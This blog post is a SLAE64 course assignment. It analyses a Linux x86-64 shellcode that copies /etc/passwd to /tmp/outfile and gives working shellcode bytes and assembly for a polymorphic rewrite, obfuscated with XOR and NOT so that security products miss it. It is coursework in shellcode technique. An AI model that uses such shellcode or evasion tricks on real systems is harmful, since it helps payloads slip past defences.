Title: SLAE64 - Assignment 6.3
Date: 2022-07-02T15:19:53.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p><p>Student ID: PA-30398</p><h2 id="foreword">Foreword</h2><p>I chose the following shellcode samples:</p><ol><li><a href="https://shell-storm.org/shellcode/files/shellcode-878.php">Read /etc/passwd - 82 bytes</a></li><li><a href="https://shell-storm.org/shellcode/files/shellcode-896.php">Add map in /etc/hosts file - 110 bytes</a></li><li><a href="https://shell-storm.org/shellcode/files/shellcode-867.php">Reads data from /etc/passwd to /tmp/outfile - 118 bytes</a></li></ol><p>In this part I'll create a polymorphic shellcode based on the third one.</p><h2 id="source-code">Source code</h2><p>The files for this part of the assignment are the following:</p><ul><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/6/3/original.nasm">original.nasm</a>, the original shellcode</li><li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/6/3/polymorphic.nasm">polymorphic.nasm</a> which is the polymorphic version I've written</li></ul><h2 id="analysis">Analysis</h2><p>Note that the shellcode present in the Cgcode from the third link is wrong. In fact, it misses some bytes.</p><p>For this reason, I had to copy the assembly instructions and assemble them manually in order to obtain the shellcode bytes.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">echo -ne "\x48\x31\xc0\xb0\x02\x48\x31\xff\xbb\x73\x77\x64\x00\x53\x48\xbb\x2f\x65\x74\x63\x2f\x70\x61\x73\x53\x48\x8d\x3c\x24\x48\x31\xf6\x0f\x05\x48\x89\xc3\x48\x31\xc0\x48\x89\xdf\x48\x89\xe6\x66\xba\xff\xff\x0f\x05\x49\x89\xc0\x48\x89\xe0\x48\x31\xdb\x53\xbb\x66\x69\x6c\x65\x53\x48\xbb\x2f\x74\x6d\x70\x2f\x6f\x75\x74\x53\x48\x89\xc3\x48\x31\xc0\xb0\x02\x48\x8d\x3c\x24\x48\x31\xf6\x6a\x66\x66\x5e\x0f\x05\x48\x89\xc7\x48\x31\xc0\xb0\x01\x48\x8d\x33\x48\x31\xd2\x4c\x89\xc2\x0f\x05" &gt; shellcode.bin</code></pre><figcaption>Shellcode bytes</figcaption></figure><p>Follows the assembly instructions that make up the shellcode, plus some comments that describe its logic:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">global _start

section .text

_start:

    ; set RAX to 2 (syscall open)
    xor rax, rax
    mov al, 2

    ; 1st argument of open: pointer to the file to open
    ; in this case the file is "/etc/passwd"
    xor rdi, rdi
    mov ebx, 0x647773
    push rbx
    movabs rbx, 0x7361702f6374652f
    push rbx
    lea rdi, [rsp]

    ; 2nd argument of open: flags (in this case O_RDONLY)
    xor rsi, rsi

    ; invoke syscall open
    syscall

    ; store the file descriptor of the opened file in RBX
    mov rbx, rax

    ; set RAX to 0 (syscall read)
    xor rax, rax

    ; 1st argument of read: file descriptor of the file
    ; from which to read the bytes
    mov rdi, rbx

    ; 2nd argument of read: pointer to the buffer that will
    ; store the bytes read from the file
    mov rsi, rsp

    ; 3rd argument of read: number of bytes to read from the
    ; file "/etc/passwd"
    mov dx, 0xffff

    ; invoke syscall read
    syscall

    ; store the number of bytes read from "/etc/passwd" into R8
    mov r8, rax

    ; save the value of RSP for later use
    mov rax, rsp

    ; string terminator
    xor rbx, rbx
    push rbx

    ; push the string "/tmp/outfile" on the stack
    mov ebx, 0x656c6966
    push rbx
    movabs rbx, 0x74756f2f706d742f
    push rbx

    ; restore the previous value of RBX
    mov rbx, rax

    ; set RAX to 2 (syscall open)
    xor rax, rax
    mov al, 2

    ; 1st argument of open: pointer to the file to open
    lea rdi, [rsp]

    ; 2nd argument of open: flags: O_RDWR|O_CREAT|0x24
    xor rsi, rsi
    push 0x66
    pop si

    ; invoke syscall open
    syscall

    ; save the file descriptor of the opened file into RDI
    mov rdi, rax

    ; set RAX to 1 (syscall write)
    xor rax, rax
    mov al, 1

    ; 2nd argument of write: pointer to buffer containing the
    ; bytes to write
    lea rsi, [rbx]

    ; 3rd argument of open: number of bytes to write inside
    ; the file "/tmp/outfile
    xor rdx, rdx
    mov rdx, r8

    ; invoke syscall write
    syscall</code></pre><figcaption>Analysis of the shellcode</figcaption></figure><p>Overall, the shellcode performs these operations:</p><ul><li>using the syscall <code>open</code> and read to read the contents of the file <code>/etc/passwd</code></li><li>using the syscall <code>open</code> to create a temporary file named <code>/tmp/outfile</code></li><li>using the syscall <code>write</code> to copy the bytes read from <code>/etc/passwd</code> in the newly-created file</li></ul><h2 id="polymorphism">Polymorphism</h2><p>Writing a polymorphic version of the shellcode, I noticed that many shellcodes on shell-storm.org aren't really optimized for size.</p><p>In this case, if you were to focus on using the minimum amount of bytes, you could certainly save around 20 bytes of shellcode.</p><p>You could save even more bytes if you decided to use a shorter name for the temporary file.</p><p>Back to the shellcode, I wrote the following assembly routines:</p><ul><li><em>OpenPasswdFile </em>opens the file <code>/etc/passwd</code></li><li><em>ReadPasswdFile</em> reads the contents of the file <code>/etc/passwd</code> and saves the bytes into a buffer</li><li><em>CreateTempFile </em>creates a new file named <code>/tmp/outfile</code></li><li><em>WriteTempFile</em> writes the bytes read from <code>/etc/passwd</code> into <code>/tmp/outfile</code></li></ul><h3 id="opening-the-file">Opening the file</h3><p>The first step is opening the file. Since the goal in this case is to modify the bytes in order achieve polymorphism and evade security products, I performed the following changes:</p><ul><li>change most of the registers</li><li>obfuscate the strings (through <code>XOR</code> operations in this case)</li><li>use <code>PUSH</code> and <code>POP</code> instead of <code>MOV</code></li><li>use <code>ADD</code> instead of <code>MOV</code></li></ul><figure class="kg-card kg-code-card"><pre><code class="language-nasm">global _start

section .text

_start:

OpenPasswdFile:

    ; clear RCX and push it to the stack
    ; to act as a string terminator
    xor ecx, ecx
    push rcx

    ; clear RSI and RAX
    push rcx
    pop rsi

    push rsi
    pop rax

    ; set RAX to 2 (syscall open)
    add al, 2

    ; XOR key
    mov rdi, 0x58b750eda5df8ee9

    ; string "sswd" xored
    mov ecx, 0xc1a8fd9a
    xor ecx, edi
    push rcx

    ; string "//etc/pa" xored
    mov rcx, 0x39c77f8ed1baa1c6
    xor rcx, rdi

    ; store the pointer to the string into RDI
    push rcx
    push rsp
    pop rdi

    ; invoke syscall open
    syscall</code></pre><figcaption>Opening the file <code>/etc/passwd</code></figcaption></figure><h3 id="reading-the-contents">Reading the contents</h3><p>For this routine I performed the same changes as before. In addition, I'm using the <code>XCHG</code> instruction instead of the <code>MOV</code> instruction you can find in the original shellcode after the call to <code>sys_open</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">ReadPasswdFile:

    ; 1st argument of open: file descriptor of
    ; the file to read
    xchg rax, rdi

    ; clear RAX and RDX
    xor eax, eax
    cdq

    ; 2nd argument of read: base address of the
    ; buffer that will store the bytes read from
    ; the file
    mov rsi, rsp

    ; 3rd argument of read: maximum number of
    ; bytes to read
    ; set DX to 0xffff
    dec dx
    
    ; invoke syscall read
    syscall</code></pre><figcaption>Reading the contents of <code>/etc/passwd</code></figcaption></figure><p>Aside from that, I also changed the way the shellcode sets the register <code>DX</code> to the value <code>0xffff</code>.</p><p>Instead of hard-coding the value in the shellcode, I'm clearing the register <code>RDX</code> and decreasing <code>DX</code>, thus resulting in <code>0xffff</code>.</p><h3 id="creating-a-temporary-file">Creating a temporary file</h3><p>As mentioned previously, one way to decrease the number of bytes of the shellcode is to shorten the name of the temporary file, which in this case is <code>/tmp/outfile</code>.</p><p>In the end I decided against, since I managed to make the polymorphic shellcode smaller even without it.</p><p>If you take a look at the snippet below, you'll notice I replaced most of the <code>MOV</code> instructions with <code>PUSH</code> and <code>POP</code> alternatives.</p><p>I also obfuscated the string <code>/tmp/out</code> (leaving "file" in clear-text) using the <code>NOT</code> operator.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">CreateTempFile:

    ; save the number of bytes read into RCX
    ; (for later usage)
    mov rbx, rax

    ; save into R8 the pointer to the buffer
    ; containing the bytes read from the file
    push rsp
    pop r8

    ; clear RAX
    xor eax, eax

    ; push the string "/tmp/outfile" to the stack
    push DWORD 0x656c6966
    mov rcx, 0x8b8a90d08f928bd0
    not rcx
    push rcx

    ; clear RSI
    push rax
    pop rsi
    
    ; set RAX to 2 (syscall open)
    add al, 2

    ; 1st argument of open: pointer to the file
    ; to open (/tmp/outfile)
    mov rdi, rsp
    
    ; 2nd argument of open: flags to use when
    ; opening the file
    ; in this case: O_RDWR|O_CREAT|0x24
    push 0x66
    pop si

    ; invoke syscall open
    syscall</code></pre><figcaption>Creating a new temporary file</figcaption></figure><h3 id="writing-to-file">Writing to file</h3><p>The last routing writes the contents of <code>/etc/passwd</code> to the file <code>/tmp/outfile</code>.</p><p>Compared to the original shellcode, I didn't use a single <code>MOV</code> instruction, preferring instead the instructions <code>XCHG</code>, <code>PUSH</code>, and <code>POP</code>.</p><p>To place the value 1 into the register <code>RAX</code>, rather than using <code>MOV</code> I chose <code>INC</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">WriteTempFile:

    ; 1st argument of syscall write: file
    ; descriptor of the file in which to write
    xchg rdi, rax

    ; set RAX to 1 (syscall write)
    xor eax, eax
    inc eax

    ; 2nd argument of write: pointer to the
    ; buffer containing the bytes to write
    push r8
    pop rsi

    ; 3rd argument of write: number of bytes
    ; to write
    push rbx
    pop rdx

    ; invoke syscall write
    syscall
</code></pre><figcaption>Copying <code>/etc/passwd</code> to the temporary file</figcaption></figure><p>In the end, the polymorphic shellcode occupies 111 bytes, which is 7 bytes less than the original shellcode.</p><p>If you don't care about the clear-text strings, then you can <em>clearly<strong> </strong></em>shrink the size even more.</p>